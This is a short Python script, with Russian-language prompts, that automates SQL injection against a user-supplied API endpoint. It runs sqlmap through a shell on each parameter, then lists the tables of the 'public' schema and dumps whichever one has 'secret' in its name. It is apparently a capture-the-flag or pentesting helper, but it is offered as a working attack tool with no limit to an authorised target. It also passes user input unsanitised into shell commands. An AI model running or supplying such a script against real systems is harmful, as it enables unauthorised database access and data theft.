import subprocess


url = input('Введите URl: ')
params = input("Введите параметры: ").split()
injectable_params=[]
host = url[:url.find('/api')]
endpoint = url[url.find('/api'):]
for param in params:
    with open('sql_in', 'w+') as f:
        f.write(f'POST {endpoint} HTTP/1.1\nHOST: {host}\n\n{{"{param}": "hack"}}')
    process = subprocess.Popen(f"sqlmap -r $(pwd)/sql_in --dbs -p {param} --batch -v 0 --flush-session", shell=True, stdout=subprocess.PIPE)
    output, _ = process.communicate()
    if "DBMS" in output.decode(): injectable_params.append(param)

if injectable_params:
    param=injectable_params[0]
    process = subprocess.Popen(f"sqlmap -r $(pwd)/sql_in -p {param} --batch -v 0 -D public --tables --flush-session", shell=True, stdout=subprocess.PIPE)
    output, _ = process.communicate()
    for line in output.decode().split():
        if "secret" in line:
            secret_table = line.strip("'")
            break

    process = subprocess.Popen(f"sqlmap -r $(pwd)/sql_in -p {param} --batch -v 0 -D public -T {secret_table} --dump --flush-session", shell=True, stdout=subprocess.PIPE)
    output, _ = process.communicate()
    print(output.decode())

    print("Уязвимые параметры: ", *injectable_params)

else: print("Уязвимых параметров нет")
